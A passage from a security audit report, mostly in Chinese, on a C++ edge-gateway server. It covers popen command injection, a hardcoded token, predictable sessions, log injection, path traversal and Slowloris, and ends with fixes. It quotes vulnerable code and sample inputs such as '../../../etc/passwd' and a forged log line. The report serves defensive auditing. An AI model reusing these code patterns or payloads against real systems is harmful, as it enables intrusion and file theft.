**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `src/main.cpp:64-68` @ `lambda(POST /debug/ping)`
**模块**: cross-module
**跨模块**: http_server → main → diagnostics

**描述**: POST /debug/ping 端点 (src/main.cpp:64-68) 无任何认证或授权机制，直接将远程客户端提供的 host 参数传递给 Diagnostics::pingHost()，后者通过 popen() 执行 shell 命令。这形成了一条完整的未认证远程代码执行 (RCE) 攻击链：不可信网络 → 无认证路由 → 命令注入 → shell 执行。攻击者无需任何凭据即可在服务器上执行任意命令。

**漏洞代码** (`src/main.cpp:64-68`)

```c
server.route("POST", "/debug/ping", [&](const HttpRequest& request) {
    std::string host = queryValue(request, "host");
    audit.event("operator", "debug-ping", host);
    return text(200, diagnostics.pingHost(host));
});
```

**达成路径**

recv()@src/http_server.cpp:113 → parseRequest() → queryValue(host)@src/main.cpp:65 → Diagnostics::pingHost(host)@src/diagnostics.cpp:7 → popen()@src/diagnostics.cpp:12

**验证说明**: 完整 RCE 链已验证：recv()@http_server.cpp:113 → parseRequest()@http_server.cpp:42 → queryValue(host)@main.cpp:65 → pingHost(host)@diagnostics.cpp:7 → 字符串拼接 'ping -c 1 ' + host@diagnostics.cpp:8 → popen()@diagnostics.cpp:12。/debug/ping 无任何认证（main.cpp:64-68 无 auth 检查）。host 参数完全由攻击者控制，无任何输入验证或 shell 元字符转义。代码库中不存在 sanitize/escape/validate/filter 函数。调用链每一步都在源码中确认存在。

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

**根因分析**: VULN-SEC-XMOD-002 是一条跨三个模块的完整 RCE 攻击链，其危险性在于**零认证 + 零输入验证 + shell 执行**的组合。攻击链涉及以下源码文件：

**入口层 — `src/http_server.cpp:81-134`**: HTTP 服务器绑定 `INADDR_ANY`（`0.0.0.0`），接受来自任何网络主机的连接。`recv()` 读取原始数据后通过 `parseRequest()` 解析，整个过程无任何 TLS 加密、IP 白名单或连接速率限制。

**路由层 — `src/main.cpp:64-68`**:
```c
// src/main.cpp:64-68
server.route("POST", "/debug/ping", [&](const HttpRequest& request) {
    std::string host = queryValue(request, "host");
    audit.event("operator", "debug-ping", host);
    return text(200, diagnostics.pingHost(host));
});
```
该路由处理函数中**无任何认证检查**——对比 `/login` 端点至少调用了 `users.authenticate()`，而 `/debug/ping` 直接将用户输入传递给危险函数。`audit.event()` 调用仅记录日志，不构成安全控制。

**执行层 — `src/diagnostics.cpp:7-22`**:
```c
// src/diagnostics.cpp:7-22
std::string Diagnostics::pingHost(const std::string& host) const {
  std::string command = "ping -c 1 " + host;
  std::array<char, 256> buffer {};
  std::ostringstream output;
  FILE* pipe = popen(command.c_str(), "r");
  if (!pipe) { return "failed to start diagnostic command\n"; }
  while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
    output << buffer.data();
  }
  pclose(pipe);
  return output.str();
}
```
`popen()` 内部调用 `/bin/sh -c`，使得 shell 元字符（`;`、`$()`、`&&`、`||`、`|`、反引号）均被解释执行。命令执行结果通过 `fgets()` 读取并作为 HTTP 响应返回给攻击者，形成**完整的命令执行-结果回显闭环**。

**潜在利用场景**:
- **零日利用**: 攻击者仅需知道服务器 IP 和端口即可发起攻击，无需任何先决条件
- **完整系统控制**: 通过反向 shell、SSH 密钥植入、cron 任务注入等手段获取持久化控制
- **供应链攻击**: 以网关为跳板，攻击内网中的其他边缘设备和后端服务
- **数据窃取**: 直接读取服务器上的所有文件、环境变量、数据库凭据等敏感信息

**修复建议**:
1. **紧急措施（0-24h）**: 从路由表中移除 `/debug/ping` 端点，或在 `HttpServer::run()` 中添加 IP 白名单仅允许 `127.0.0.1`
2. **短期修复（1-7天）**: 使用 `execvp("ping", ["ping", "-c", "1", host])` 替代 `popen()`，避免 shell 解释；添加 hostname/IP 格式正则白名单验证
3. **长期方案**: 使用 raw socket 或 `libcurl` 实现网络诊断功能；为所有管理端点添加基于令牌的认证中间件；实施网络分段，将管理接口与公共接口隔离

---

## 4. High 漏洞 (10)

### [VULN-DF-FC-002] hardcoded_credentials - FileCache::exportSnapshot

**严重性**: High | **CWE**: CWE-798 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `src/file_cache.cpp:21-24` @ `FileCache::exportSnapshot`
**模块**: file_cache

**描述**: The exportSnapshot() function uses a hardcoded secret token "letmein-export" (line 22) as the sole authorization mechanism for the /admin/export endpoint. The token is embedded directly in the source code as a string literal. Any party with access to the source code or binary (via reverse engineering or string extraction) can trivially bypass authorization. The endpoint is accessible via unauthenticated HTTP GET request with the token passed as a query parameter (main.cpp:70-73), meaning the token also appears in server access logs, browser history, and proxy logs. Additionally, upon successful authentication, the function leaks the server's internal baseDir_ path in its response (line 29: "data_dir=" << baseDir_), constituting minor information disclosure.

**漏洞代码** (`src/file_cache.cpp:21-24`)

```c
// src/file_cache.cpp:21-24
std::string FileCache::exportSnapshot(const std::string& token) const {
  if (token != "letmein-export") {  // hardcoded secret
    return "denied\n";
  }
```

**达成路径**

src/http_server.cpp:113 recv() [SOURCE - network input]
src/http_server.cpp parseRequest() → parseQuery()
src/main.cpp:71 queryValue(request, "token") - extracts tainted 'token' from query params
src/main.cpp:73 files.exportSnapshot(token) - passes tainted token to FileCache
src/file_cache.cpp:22 token != "letmein-export" [SINK - hardcoded credential comparison]

**验证说明**: Confirmed hardcoded credentials (duplicate finding with VULN-SEC-FC-001 from different scanner). Same hardcoded token "letmein-export" at file_cache.cpp:22 in exportSnapshot(). Dataflow-scanner independently identified the same vulnerability. Token is sole auth for /admin/export, accessible via unauthenticated HTTP GET. Additionally notes minor info disclosure of baseDir_ path at line 29.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-DF-US-003] predictable_token - UserStore::issueSession

**严重性**: High | **CWE**: CWE-341 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `src/user_store.cpp:33-36` @ `UserStore::issueSession`
**模块**: user_store

**描述**: Session tokens are generated with zero randomness using the deterministic format 'sess-{username}-{unix_timestamp}'. Both components (username and current time) are observable or predictable by an attacker. An attacker who knows a valid username and can estimate the server time can enumerate all possible session tokens (one per second). This enables session hijacking without authentication. The token is returned directly in the HTTP response body and also written to the audit log, creating additional exposure surfaces.

**漏洞代码** (`src/user_store.cpp:33-36`)

```c
std::string UserStore::issueSession(const std::string& username) const {
  char token[32];
  std::sprintf(token, "sess-%s-%ld", username.c_str(), static_cast<long>(std::time(nullptr)));
  return token;
}
```

**达成路径**

src/user_store.cpp:35 sprintf(token, "sess-%s-%ld", username, time()) [SOURCE] - deterministic token generation
src/main.cpp:50 audit.event(username, "login-success", token) - token logged to audit file
src/main.cpp:51 text(200, "session=" + token) [SINK] - token returned in HTTP response to client

**验证说明**: Confirmed (duplicate of VULN-SEC-SESS-001): Session tokens generated with zero randomness using deterministic format sess-{username}-{unix_timestamp}. Both components observable/predictable by attacker. Token returned in HTTP response and written to audit log. Source: dataflow-scanner detected predictable_token pattern at same location. Severity remains High (no upgrade rule applies for High severity).

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-DF-AUDIT-001] log_injection - AuditLog::event

**严重性**: High | **CWE**: CWE-117 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner, security-auditor

**位置**: `include/audit_log.hpp:11-14` @ `AuditLog::event`
**模块**: audit_log

**描述**: AuditLog::event() writes user-controlled parameters (user, action, detail) directly to the audit log file via std::ofstream without any sanitization of newline characters (\n, \r), control characters, or log-formatting metacharacters. The POST body (request.body) is the highest-risk vector: it is read verbatim from the network socket and passed as the 'detail' parameter, allowing an attacker to inject arbitrary newlines to forge fake audit log entries, cover attack traces, or corrupt forensic evidence. Example attack: POST /login with body containing '\n1700000000 user=attacker action=admin-delete detail=covered_tracks' creates a fake log entry.

**漏洞代码** (`include/audit_log.hpp:11-14`)

```c
void event(const std::string& user, const std::string& action, const std::string& detail) {
    out_ << std::time(nullptr) << " user=" << user
         << " action=" << action
         << " detail=" << detail << "\n";
}
```

**达成路径**

src/http_server.cpp:113 recv(client, buffer, ...) [SOURCE - network socket]
src/http_server.cpp:66 body << stream.rdbuf() [body extracted verbatim, newlines preserved]
src/http_server.cpp:119 parseRequest() returns HttpRequest with tainted body
src/main.cpp:43 audit.event(username, "login-attempt", request.body) [tainted body passed as detail]
include/audit_log.hpp:14 out_ << ... << detail << "\n" [SINK - written to log without sanitization]

**验证说明**: Confirmed: AuditLog::event() writes user/action/detail parameters directly to ofstream without any newline (\n, \r) or control character sanitization. The highest-risk vector is request.body (POST body) passed as detail at main.cpp:43 - body is extracted verbatim via stream.rdbuf() preserving all characters including newlines. Attacker can inject arbitrary log entries by embedding \n followed by forged log lines in the POST body. All three parameters (user, action, detail) are unsanitized; multiple call sites pass user-controlled data: queryValue results at lines 56, 66, 72 and request.body at line 43. No mitigations found anywhere in the chain: no escape/sanitize/replace operations on any parameter.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-MAIN-001] credential_in_url - main (POST /login lambda)

**严重性**: High | **CWE**: CWE-598 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `src/main.cpp:40-42` @ `main (POST /login lambda)`
**模块**: main

**描述**: Password credential extracted from URL query string in POST /login route. Although the HTTP method is POST, the password is passed as a URL query parameter (?password=...) rather than in the request body. URL query strings are logged by web servers, proxies, stored in browser history, and may leak via Referer headers. The queryValue() helper reads from request.query which is populated from the URL query string.

**漏洞代码** (`src/main.cpp:40-42`)

```c
std::string password = queryValue(request, "password");
```

**达成路径**

HTTP request URL query string [SOURCE]
src/main.cpp:13 queryValue() extracts from request.query map
src/main.cpp:42 password variable holds credential from URL
src/main.cpp:45 users.authenticate(username, password) [SINK - credential used]

**验证说明**: Confirmed credential in URL. POST /login extracts password via queryValue() which reads from request.query (URL query string map, http_server.hpp:10). Despite using POST method, the password credential is passed as a URL query parameter, exposing it in server logs, proxy logs, browser history, and Referer headers.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-MAIN-002] credential_in_url - main (GET /admin/export lambda)

**严重性**: High | **CWE**: CWE-598 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `src/main.cpp:70-73` @ `main (GET /admin/export lambda)`
**模块**: main

**描述**: Admin authentication token extracted from URL query string in GET /admin/export route. The token is a sensitive credential used for authorization of the export operation. GET request parameters are always visible in the URL, logged by web servers, proxies, browser history, and may leak via Referer headers to third-party resources.

**漏洞代码** (`src/main.cpp:70-73`)

```c
std::string token = queryValue(request, "token");
audit.event("admin", "export", token);
return text(200, files.exportSnapshot(token));
```

**达成路径**

HTTP request URL query string [SOURCE]
src/main.cpp:13 queryValue() extracts from request.query map
src/main.cpp:71 token variable holds admin credential from URL
src/main.cpp:72 audit.event() logs token to file [SINK - credential logged]
src/main.cpp:73 files.exportSnapshot(token) [SINK - credential used for auth]

**验证说明**: Confirmed credential in URL. GET /admin/export extracts admin auth token via queryValue() from URL query string. GET requests make all parameters visible in the URL. Token is used for admin authorization and is also logged to audit file (line 72), creating dual exposure.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-MAIN-005] sensitive_data_in_log - main (GET /admin/export lambda)

**严重性**: High（原评估: Medium → 验证后: High） | **CWE**: CWE-532 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `src/main.cpp:71-72` @ `main (GET /admin/export lambda)`
**模块**: main

**描述**: Admin authentication token from URL query parameter is written in plaintext to the audit log file (edge-gateway.audit.log). The AuditLog::event() method writes the token directly as the 'detail' field. This admin credential is persisted in the log file and accessible to anyone with log file read access.

**漏洞代码** (`src/main.cpp:71-72`)

```c
std::string token = queryValue(request, "token");
audit.event("admin", "export", token);
```

**达成路径**

HTTP request URL query string [SOURCE]
src/main.cpp:71 token extracted from URL query
src/main.cpp:72 token passed to audit.event() as detail parameter
include/audit_log.hpp:12 out_ << ... << " detail=" << detail writes token to file [SINK]

**验证说明**: Confirmed sensitive data in log. Admin authentication token from URL query parameter is written in plaintext to audit log (audit_log.hpp:12-14 writes detail field verbatim). Token is fully user-controlled and persisted in log file. Severity upgraded from Medium to High because confidence >= 80 and reachability is direct_external (token comes directly from HTTP query parameter).

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-DF-MAIN-002] path_traversal - lambda(GET /files)

**严重性**: High | **CWE**: CWE-22 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `src/main.cpp:54-61` @ `lambda(GET /files)`
**模块**: main
**跨模块**: main → file_cache

**描述**: The /files route extracts 'name' from query parameters via queryValue() and passes it directly to FileCache::readTextFile() with no path validation. FileCache is constructed with baseDir="data", but the 'name' parameter is not sanitized for directory traversal sequences (e.g., '../../../etc/passwd'). No path canonicalization, no '../' filtering, no allowlist of permitted filenames exists in the data flow. An attacker can read arbitrary files on the filesystem accessible to the process.

**漏洞代码** (`src/main.cpp:54-61`)

```c
// src/main.cpp:54-61
server.route("GET", "/files", [&](const HttpRequest& request) {
    std::string name = queryValue(request, "name");  // TAINTED: user-controlled
    audit.event("anonymous", "read-file", name);
    try {
      return text(200, files.readTextFile(name));  // SINK: file read, no path validation
    } catch (const std::exception& ex) {
      return text(404, std::string("error=") + ex.what() + "\n");
    }
});
```

**达成路径**

src/main.cpp:55 queryValue(request, "name") [SOURCE: HTTP query parameter]
src/main.cpp:55 std::string name = ... [TAINTED variable]
src/main.cpp:58 files.readTextFile(name) [SINK: file open/read, OUT → FileCache module]

**验证说明**: Confirmed path traversal. file_cache.cpp:11 opens baseDir_ + '/' + name where baseDir_='data' and name is user-controlled from HTTP query. No path canonicalization, no '../' filtering, no allowlist. Input like '../../../etc/passwd' resolves to arbitrary file read. The try/catch in main.cpp only handles errors after the traversal attempt, not preventing it.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-DF-MAIN-003] log_injection - lambda(POST /login)

**严重性**: High（原评估: Medium → 验证后: High） | **CWE**: CWE-117 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `src/main.cpp:40-51` @ `lambda(POST /login)`
**模块**: main

**描述**: The /login route passes unsanitized user input (username from query param, request.body) directly to AuditLog::event(). The AuditLog::event() method (inline in audit_log.hpp:11-15) writes these values directly to a log file via 'out_ << user << action << detail' with NO newline escaping or special character sanitization. An attacker can inject newline characters (\n) in the 'user' parameter or request body to forge arbitrary log entries, enabling log forgery, false audit trails, or SIEM evasion. Multiple routes (/login, /files, /debug/ping, /admin/export) all pass tainted data to audit.event() without sanitization.

**漏洞代码** (`src/main.cpp:40-51`)

```c
// src/main.cpp:40-43 (login route)
server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");  // TAINTED
    std::string password = queryValue(request, "password");
    audit.event(username, "login-attempt", request.body);  // SINK: both username and body are tainted
//
// include/audit_log.hpp:11-15 (inline sink)
void event(const std::string& user, const std::string& action, const std::string& detail) {
    out_ << std::time(nullptr) << " user=" << user       // TAINTED data written directly to file
         << " action=" << action
         << " detail=" << detail << "\n";                // No escaping of newlines/special chars
}
```

**达成路径**

src/main.cpp:41 queryValue(request, "user") [SOURCE: HTTP query parameter]
src/main.cpp:41 std::string username = ... [TAINTED]
src/main.cpp:43 audit.event(username, "login-attempt", request.body) [PROPAGATION]
include/audit_log.hpp:12 out_ << ... << user << ... << detail [SINK: file write, no sanitization]

**验证说明**: Confirmed log injection. audit_log.hpp:11-15 writes user, action, and detail parameters directly to log file via stream insertion (<<) with NO newline escaping or special character sanitization. Attacker-controlled username (from query param) and request.body are passed to audit.event() at main.cpp:43. Injecting '\n' in username creates forged log entries, enabling audit trail manipulation and SIEM evasion. Severity upgraded from Medium to High because confidence >= 80 and reachability is direct_external.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-DF-HTTP-002] resource_exhaustion - HttpServer::run

**严重性**: High（原评估: Medium → 验证后: High） | **CWE**: CWE-400 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `src/http_server.cpp:106-113` @ `HttpServer::run`
**模块**: http_server

**描述**: Blocking recv() without socket timeout enables denial-of-service via slow connections (Slowloris-style attack). The server is single-threaded and uses a blocking recv() call at line 113 without setting SO_RCVTIMEO on the client socket. A malicious client can establish a TCP connection and send HTTP data one byte at a time with long delays between bytes, causing recv() to block indefinitely. Since the server handles connections synchronously (one at a time in the for-loop at line 105), a single slow connection blocks the entire server from accepting or processing any other requests. The listen backlog of 16 (line 100) provides minimal buffering for queued connections, which will also fill up and be dropped.

**漏洞代码** (`src/http_server.cpp:106-113`)

```c
int client = accept(fd, nullptr, nullptr);
if (client < 0) {
  continue;
}
char buffer[4096];
std::memset(buffer, 0, sizeof(buffer));
ssize_t n = recv(client, buffer, sizeof(buffer) - 1, 0);
```

**达成路径**

src/http_server.cpp:106 accept(fd, nullptr, nullptr) [SOURCE: accepts connection from any remote client]
src/http_server.cpp:113 recv(client, buffer, 4095, 0) [SINK: blocking call with no timeout, attacker controls data delivery rate]
Note: No setsockopt(SO_RCVTIMEO) call exists anywhere in the module

**验证说明**: 确认单线程HTTP服务器使用阻塞recv()且未设置socket超时，易受Slowloris式拒绝服务攻击。关键证据: (1)for循环(line 105)同步处理连接，一次一个; (2)recv()(line 113)为阻塞调用; (3)grep确认全模块无SO_RCVTIMEO设置(仅有SO_REUSEADDR在line 88); (4)无异步I/O或多路复用; (5)listen backlog仅16(line 100)。攻击者可建立TCP连接后以极低速率发送数据(每字节间长延迟)，使recv()无限阻塞，阻止服务器accept()或处理任何其他连接。单个慢连接即可瘫痪整个服务器。严重性从Medium升级为High(置信度85>=80且reachability=direct_external)。

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-XMOD-003] credential_leak_via_log - lambda(POST /login)

**严重性**: High | **CWE**: CWE-532 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `src/main.cpp:43-50` @ `lambda(POST /login)`
**模块**: cross-module
**跨模块**: http_server → main → audit_log → user_store

**描述**: POST /login 路由 (src/main.cpp:43) 将完整的 request.body（包含 user 和 password 查询参数）作为 detail 传递给 AuditLog::event()，导致用户密码明文持久化写入 edge-gateway.audit.log 文件。同时 src/main.cpp:50 将会话令牌写入日志，src/main.cpp:72 将管理员令牌写入日志。这些敏感凭据跨模块流动：http_server(接收) → main(传递) → audit_log(持久化)，任何能读取日志文件的进程或用户都可提取有效凭据。

**漏洞代码** (`src/main.cpp:43-50`)

```c
audit.event(username, "login-attempt", request.body);  // password in body
...
audit.event(username, "login-success", token);  // session token
```

**达成路径**

recv()@http_server.cpp:113 → request.body → audit.event(detail)@main.cpp:43 → ofstream@audit_log.hpp:12-14 → edge-gateway.audit.log

**验证说明**: 凭据泄露链已验证：(1) main.cpp:43 将 request.body 作为 detail 传给 audit.event()，若客户端在 POST body 中发送凭据（标准表单提交），密码明文被记录；(2) main.cpp:50 将会话令牌 (sess-{user}-{timestamp}) 无条件写入日志；(3) main.cpp:72 将管理员导出令牌无条件写入日志。AuditLog::event()@audit_log.hpp:11-14 直接将 detail 写入 ofstream，无任何脱敏/过滤。令牌格式可预测（用户名+时间戳），日志文件 'edge-gateway.audit.log' 可被其他进程读取。调用链完整：http_server(接收) → main(传递) → audit_log(持久化)。

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

## 5. Low 漏洞 (1)

### [VULN-SEC-MAIN-006] sensitive_data_in_log - main (POST /login lambda)

**严重性**: Low | **CWE**: CWE-532 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `src/main.cpp:40-43` @ `main (POST /login lambda)`
**模块**: main

**描述**: The entire HTTP request body is written to the audit log for every login attempt. While the current code extracts credentials from the URL query string, clients may also include sensitive data in the POST body (e.g., form-encoded credentials, JSON payloads). The unsanitized request body is persisted to the audit log file without any filtering or redaction.

**漏洞代码** (`src/main.cpp:40-43`)

```c
server.route("POST", "/login", [&](const HttpRequest& request) {
  std::string username = queryValue(request, "user");
  std::string password = queryValue(request, "password");
  audit.event(username, "login-attempt", request.body);
```

**达成路径**

HTTP request body [SOURCE]
src/main.cpp:43 request.body passed to audit.event() as detail parameter
include/audit_log.hpp:12 out_ << ... << " detail=" << detail writes body to file [SINK]

**验证说明**: Confirmed sensitive data in log. The entire HTTP request body is passed to audit.event() as the detail parameter (main.cpp:43) and written verbatim to the audit log file (audit_log.hpp:12-14). While the current code extracts credentials from URL query params rather than the body, clients may include sensitive data in POST bodies (form-encoded credentials, JSON payloads). The unsanitized body is persisted to the log file. Severity remains Low as no upgrade rule applies to Low-severity findings.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

## 6. 模块漏洞分布

| 模块 | Critical | High | Medium | Low | 合计 |
|------|----------|------|--------|-----|------|
| audit_log | 1 | 1 | 0 | 0 | 2 |
| cross-module | 1 | 1 | 0 | 0 | 2 |
| diagnostics | 2 | 0 | 0 | 0 | 2 |
| file_cache | 2 | 1 | 0 | 0 | 3 |
| http_server | 0 | 1 | 0 | 0 | 1 |
| main | 1 | 5 | 0 | 1 | 7 |
| user_store | 4 | 1 | 0 | 0 | 5 |
| **合计** | **11** | **10** | **0** | **1** | **22** |

## 7. CWE 分布

| CWE | 数量 | 占比 |
|-----|------|------|
| CWE-798 | 4 | 18.2% |
| CWE-78 | 4 | 18.2% |
| CWE-532 | 4 | 18.2% |
| CWE-598 | 2 | 9.1% |
| CWE-22 | 2 | 9.1% |
| CWE-117 | 2 | 9.1% |
| CWE-916 | 1 | 4.5% |
| CWE-400 | 1 | 4.5% |
| CWE-341 | 1 | 4.5% |
| CWE-330 | 1 | 4.5% |

---

## 修复建议

### 优先级 1: 立即修复（0-48 小时）

以下 Critical 漏洞可被远程攻击者无认证利用，需立即处置：

| 漏洞 | 风险 | 修复措施 |
|------|------|----------|
| **VULN-SEC-XMOD-002 / VULN-DF-DIAG-001 / VULN-SEC-CMDI-001** (RCE/命令注入) | 未认证远程代码执行，攻击者可完全控制服务器 | **移除 `/debug/ping` 端点**或限制为 `127.0.0.1` 访问；若需保留，使用 `execvp()` 替代 `popen()` 并添加 hostname 白名单正则校验 |
| **VULN-DF-FC-001 / VULN-DF-MAIN-002** (路径遍历) | 未认证读取服务器任意文件 | 在 `FileCache::readTextFile()` 中添加 `std::filesystem::canonical()` 路径规范化，验证解析后路径仍以 `baseDir_` 为前缀；拒绝包含 `..` 的输入 |
| **VULN-SEC-CRED-001 / VULN-DF-US-001 / VULN-SEC-FC-001** (硬编码凭据) | 源码/二进制中暴露所有用户密码和管理员令牌 | 将凭据迁移至环境变量或外部配置文件（`chmod 600`）；将 `"letmein-export"` 替换为从安全存储读取的运行时配置 |
| **VULN-SEC-HASH-001** (弱密码哈希) | DJB2 32 位哈希可被秒级暴力破解 | 引入 `libargon2` 或 `bcrypt` 库，替换 `weakHash()` 为 argon2id（内存 64MB、迭代 3 次、并行度 4）；在下次登录时自动迁移用户哈希 |
| **VULN-SEC-SESS-001 / VULN-DF-US-003** (可预测会话令牌) | 会话令牌可被枚举伪造 | 使用 `/dev/urandom` 或 `std::random_device` 生成至少 128 位随机令牌；格式改为 `sess-{32字节hex}` |

### 优先级 2: 短期修复（1-2 周）

以下 High 漏洞需尽快修复，但利用条件略高于 Critical 漏洞：

| 漏洞类别 | 涉及漏洞 | 修复措施 |
|----------|----------|----------|
| **凭据泄露 via 日志** | VULN-SEC-LOG-002, VULN-SEC-XMOD-003, VULN-SEC-MAIN-005, VULN-SEC-MAIN-006 | 在 `AuditLog::event()` 中添加敏感字段脱敏：对 `detail` 参数中的 `password=`、`token=` 值进行掩码处理（替换为 `***`）；禁止将 `request.body` 原文写入日志 |
| **日志注入** | VULN-DF-AUDIT-001, VULN-DF-MAIN-003 | 在 `AuditLog::event()` 中对所有参数进行换行符转义：将 `\n` 替换为 `\\n`，将 `\r` 替换为 `\\r`，防止伪造日志条目 |
| **凭据 via URL** | VULN-SEC-MAIN-001, VULN-SEC-MAIN-002 | 将 `/login` 端点的密码改为从 POST body（JSON 或 form-encoded）中提取，而非 URL query 参数；将 `/admin/export` 的 token 改为 HTTP `Authorization` 头传递 |
| **拒绝服务** | VULN-DF-HTTP-002 | 在 `accept()` 后对客户端 socket 设置 `SO_RCVTIMEO`（建议 5 秒超时）；考虑引入 `epoll`/`select` 多路复用替代阻塞式 `recv()` |

### 优先级 3: 计划修复（1-3 个月）

以下改进需纳入开发路线图，从根本上提升安全基线：

1. **认证与授权框架**: 为所有非健康检查端点添加中间件式认证层。管理端点（`/admin/*`、`/debug/*`）应要求管理员角色；普通端点要求有效会话令牌
2. **输入验证层**: 在 `parseQuery()` 中添加 URL 解码（`%xx` 序列）；为每个端点定义输入 schema（类型、长度、格式约束），拒绝不合规输入
3. **TLS 加密**: 为 HTTP 服务器添加 TLS 支持（至少 TLS 1.2），防止网络嗅探和中间人攻击
4. **安全编译选项**: 启用 `-fstack-protector-strong`、`-D_FORTIFY_SOURCE=2`、`-fPIE -pie`（ASLR）、`-Wformat -Wformat-security` 编译选项
5. **日志安全**: 实施结构化日志格式（JSON），自动转义特殊字符；设置日志文件权限为 `0600`；定期轮转和归档
6. **安全测试**: 将 SAST/DAST 工具集成到 CI/CD 流水线，确保新代码不引入同类漏洞
